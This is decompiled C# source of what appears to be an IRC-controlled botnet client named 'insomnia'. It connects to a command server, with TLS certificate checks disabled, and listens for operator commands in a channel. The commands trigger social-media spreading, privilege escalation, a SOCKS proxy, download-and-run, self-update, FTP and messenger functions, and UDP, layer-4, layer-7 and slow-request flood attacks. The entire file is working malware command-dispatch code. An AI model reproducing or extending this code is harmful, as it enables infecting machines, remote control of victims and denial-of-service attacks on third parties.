using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace insomnia;

internal class Class31
{
	[CompilerGenerated]
	private sealed class Class32
	{
		public string Field4;

		public string Field3;

		public string Field2;

		public string[] Field1;

		public void Method8()
		{
			Class24.Method1(Field1);
		}

		public void Method7()
		{
			Class37.Method4(Field4);
		}

		public void Method6()
		{
			Class33.Method7(Field4, Field3, Field2);
		}

		public void Method5()
		{
			Class33.Method17(Field4, Field3);
		}

		public void Method4()
		{
			Class33.Method21(Field4, Field3, Field2);
		}

		public void Method3()
		{
			Class33.Method19(Field4, Field3, Field2);
		}

		public void Method2()
		{
			Class33.Method20(Field4, Field3);
		}

		public void Method1()
		{
			Class33.Method18(Field4, Field3);
		}
	}

	public static StreamWriter Field13;

	public static StreamReader Field12;

	public static TcpClient Field11;

	public static SslStream Field10;

	public static NetworkStream Field9;

	public static int Field8 = 0;

	public static bool Field7 = false;

	public static string Field6 = "";

	public static string Field5 = "";

	public static string Field4 = "";

	public static string Field3 = "";

	public static bool Field2 = false;

	public static string Field1 = Class26.Field8;

	public static void Method7(string[] A_0, string A_1, string A_2, int[] A_3, string A_4)
	{
		try
		{
			try
			{
				Field11 = new TcpClient(A_0[Field8], A_3[Field8]);
				RemoteCertificateValidationCallback userCertificateValidationCallback = Method2;
				Field10 = new SslStream(Field11.GetStream(), leaveInnerStreamOpen: false, userCertificateValidationCallback);
				Field10.AuthenticateAsClient(A_0[0]);
				Field12 = new StreamReader(Field10);
				Field13 = new StreamWriter(Field10);
				Field13.AutoFlush = true;
			}
			catch
			{
				Field11 = new TcpClient(A_0[Field8], A_3[Field8]);
				Field9 = Field11.GetStream();
				Field12 = new StreamReader(Field9);
				Field13 = new StreamWriter(Field9);
				Field13.AutoFlush = true;
			}
			Field13.WriteLine("PASS " + Class26.Field9[Field8]);
			Field13.WriteLine("NICK " + Class26.Field18);
			Field13.WriteLine("USER " + Class26.Field19 + " 0 * :" + Class26.Field19);
			while (true)
			{
				if (!Field11.Connected)
				{
					Thread.Sleep(15000);
					Method1();
				}
				string[] array = new string[1] { "" };
				string[] array2 = new string[1] { "" };
				try
				{
					string text = Field12.ReadLine();
					array = text.Split(new char[1] { ' ' });
					array2 = text.Split(new char[1] { ':' });
					_ = 1;
					if (array[1] == "332")
					{
						Class33.Method23(array[4].TrimStart(new char[1] { ':' }));
					}
					if (array[0] == "PING")
					{
						Field13.WriteLine("PONG " + array[1]);
						continue;
					}
					if (array[0].Contains("001") || array[1].Contains("001"))
					{
						Field13.WriteLine("JOIN " + Class26.Field8 + " " + Class26.Field7);
					}
					Field2 = true;
					Method5(text);
				}
				catch
				{
				}
			}
		}
		catch
		{
			while (true)
			{
				try
				{
					Method6();
					if (!Class39.Field4 && !Field11.Connected)
					{
						Thread.Sleep(10000);
						Method1();
					}
					break;
				}
				catch
				{
					Thread.Sleep(10000);
				}
			}
		}
	}

	private static void Method6()
	{
		int num = Class26.Field10.Length - 1;
		if (Field8 == num)
		{
			Field8 = 0;
		}
		else
		{
			Field8++;
		}
	}

	public static void Method5(string A_0)
	{
		try
		{
			string[] array = A_0.Split(new char[1] { ' ' });
			string[] array2 = array[0].Split(new char[1] { '@' });
			string text = array2[1];
			string text2 = array[1];
			Field1 = array[2].TrimStart(new char[1] { ':' });
			string a_ = array[3].TrimStart(new char[1] { ':' });
			string field = array2[0].Split(new char[1] { ':' })[1].Split(new char[1] { '!' })[0];
			if (Field1 == Class26.Field18)
			{
				Field1 = field;
			}
			if (array.Length > 4)
			{
				Field6 = array[4];
			}
			else
			{
				Field6 = "";
			}
			if (array.Length > 5)
			{
				Field5 = array[5];
			}
			else
			{
				Field5 = "";
			}
			if (array.Length > 6)
			{
				Field4 = array[6];
			}
			else
			{
				Field4 = "";
			}
			if (array.Length > 7)
			{
				Field3 = array[7];
			}
			else
			{
				Field3 = "";
			}
			switch (text2)
			{
			case "TOPIC":
				if (Class26.Field14)
				{
					Class33.Method23(a_);
				}
				break;
			case "KILL":
				Field13.Close();
				Field12.Close();
				Field11.Close();
				Class13.Field9.Start();
				break;
			case "KICK":
				Field13.WriteLine("JOIN " + Class26.Field8 + " " + Class26.Field7);
				break;
			}
			if (text == Class26.Field11 && text2 != "TOPIC")
			{
				Method4(a_, Field1, Field6, Field5, Field4, Field3, array);
			}
		}
		catch
		{
		}
	}

	public static void Method4(string A_0, string A_1, string A_2, string A_3, string A_4, string A_5, string[] A_6)
	{
		switch (A_0)
		{
		case ".fbspread":
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				Class24.Method1(A_6);
			});
			thread.IsBackground = true;
			thread.Start();
			break;
		}
		case ".getadmin":
			Class33.Method28();
			break;
		case ".acc":
		{
			Thread thread8 = new Thread((ThreadStart)delegate
			{
				Class37.Method4(A_2);
			});
			thread8.IsBackground = true;
			thread8.Start();
			break;
		}
		case ".v":
			Method3(Class33.Method26(), A_1);
			break;
		case ".open":
			Class33.Method22(A_2, A_3);
			break;
		case ".socks":
			Class33.Method15();
			break;
		case ".rm":
			Class33.Method14();
			break;
		case ".im":
			Class33.Method13();
			break;
		case ".ftp":
			Class33.Method12();
			break;
		case ".up":
			Class33.Method8(A_2, A_3);
			break;
		case ".rc":
			Field13.WriteLine("QUIT :reconnecting");
			Field11.Close();
			Thread.Sleep(10000);
			Method1();
			break;
		case ".bk":
			Class33.Method11(A_2);
			break;
		case ".j":
			Field13.WriteLine("JOIN " + A_2);
			break;
		case ".p":
			Field13.WriteLine("PART " + A_2);
			break;
		case ".sort":
			Field13.WriteLine("JOIN #" + Class39.Method17());
			break;
		case ".permsort":
			if (Class39.Method20() == "a")
			{
				Field13.WriteLine("JOIN #admins");
			}
			else
			{
				Field13.WriteLine("JOIN #users");
			}
			break;
		case ".unsort":
			Field13.WriteLine("PART #" + Class39.Method17());
			break;
		case ".avinfo":
			Class33.Method10();
			break;
		case ".speedtest":
			Class33.Method9(A_2);
			break;
		case ".dl":
		{
			Thread thread7 = new Thread((ThreadStart)delegate
			{
				Class33.Method7(A_2, A_3, A_4);
			});
			thread7.IsBackground = true;
			thread7.Start();
			break;
		}
		case ".read":
			Class33.Method25(A_2);
			break;
		case ".stop":
			Class33.Method16(A_0: true);
			break;
		case ".arme":
		{
			Thread thread6 = new Thread((ThreadStart)delegate
			{
				Class33.Method17(A_2, A_3);
			});
			thread6.IsBackground = true;
			thread6.Start();
			break;
		}
		case ".udp":
		{
			Thread thread5 = new Thread((ThreadStart)delegate
			{
				Class33.Method21(A_2, A_3, A_4);
			});
			thread5.IsBackground = true;
			thread5.Start();
			break;
		}
		case ".layer4":
		{
			Thread thread4 = new Thread((ThreadStart)delegate
			{
				Class33.Method19(A_2, A_3, A_4);
			});
			thread4.IsBackground = true;
			thread4.Start();
			break;
		}
		case ".layer7":
		{
			Thread thread3 = new Thread((ThreadStart)delegate
			{
				Class33.Method20(A_2, A_3);
			});
			thread3.IsBackground = true;
			thread3.Start();
			break;
		}
		case ".slow":
		{
			Thread thread2 = new Thread((ThreadStart)delegate
			{
				Class33.Method18(A_2, A_3);
			});
			thread2.IsBackground = true;
			thread2.Start();
			break;
		}
		case ".m":
			if (A_2 == "on")
			{
				Field7 = true;
			}
			if (A_2 == "off")
			{
				Field7 = false;
			}
			break;
		}
	}

	public static void Method3(string A_0, string A_1)
	{
		if (!Field7)
		{
			Field13.WriteLine("PRIVMSG " + A_1 + " :" + A_0);
		}
	}

	private static bool Method2(object A_0, X509Certificate A_1, X509Chain A_2, SslPolicyErrors A_3)
	{
		return true;
	}

	public static void Method1()
	{
		Method7(Class26.Field10, Class26.Field8, Class26.Field7, Class26.Field6, Class26.Field11);
	}
}
